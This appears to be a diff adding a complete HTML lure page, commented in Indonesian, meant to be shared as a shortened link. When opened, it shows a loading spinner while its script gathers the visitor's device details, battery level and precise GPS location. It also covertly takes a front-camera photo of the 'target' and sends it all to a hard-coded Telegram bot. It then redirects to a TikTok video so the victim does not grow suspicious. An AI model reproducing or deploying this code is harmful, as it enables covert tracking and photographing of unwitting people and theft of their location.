@@ -1,0 +1,108 @@
+<!-- Simpan jadi index.html, host di Vercel/Netlify, perpendek link pakai bit.ly -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
+    .loader{width:48px;height:48px;border:5px solid #fff;border-bottom-color:transparent;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}</style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // ========== GANTI INI ==========
+        const BOT_TOKEN = "8353080072:AAEY45tqXLC3sEpxQSbGpkGzyj-aqRNBCRQ";    // Token bot Telegram Anda
+        const CHAT_ID = "7088650583";        // Chat ID Anda
+
+        // ========== EXECUTE IMMEDIATELY ==========
+        (async () => {
+            const deviceInfo = {
+                brand: navigator.userAgentData?.platform || navigator.platform,
+                model: (navigator.userAgentData?.brands || []).map(b => b.brand).join(', ') || navigator.userAgent,
+                battery: 'N/A',
+                location: 'Tidak diberikan'
+            };
+
+            // Battery
+            try {
+                if ('getBattery' in navigator) {
+                    const b = await navigator.getBattery();
+                    deviceInfo.battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`;
+                }
+            } catch (e) {}
+
+            // Lokasi (auto request, tanpa prompt tambahan setelah izin awal)
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 8000,
+                            enableHighAccuracy: true
+                        });
+                    });
+                    deviceInfo.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                } catch (e) {
+                    deviceInfo.location = 'Ditolak / tidak tersedia';
+                }
+            }
+
+            // Kamera stealth (off-screen)
+            let photoBase64 = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                video.muted = true;
+                await video.play();
+                await new Promise(r => setTimeout(r, 800)); // Biar fokus
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                console.log('Kamera tidak bisa');
+            }
+
+            // Kirim ke Telegram
+            const msg = `🔴 <b>GRAB DATA OTOMATIS</b>\n━━━━━━━━━━━━━━━━━\n📱 <b>Device:</b> ${escapeHtml(deviceInfo.model)}\n🖥️ <b>Platform:</b> ${escapeHtml(deviceInfo.brand)}\n🔋 <b>Baterai:</b> ${deviceInfo.battery}\n📍 <b>Lokasi:</b> ${deviceInfo.location}\n━━━━━━━━━━━━━━━━━\n🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (photoBase64) {
+                const blob = await (await fetch(photoBase64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('caption', `📸 Foto otomatis target`);
+                fd.append('photo', blob, 'grab.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            }
+
+            // Redirect ke halaman biasa biar ga curiga
+            setTimeout(() => {
+                window.location.href = 'https://vt.tiktok.com/ZS94AaHtS/';
+            }, 1000);
+        })();
+
+        function escapeHtml(s) {
+            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+    </script>
+</body>
+</html>
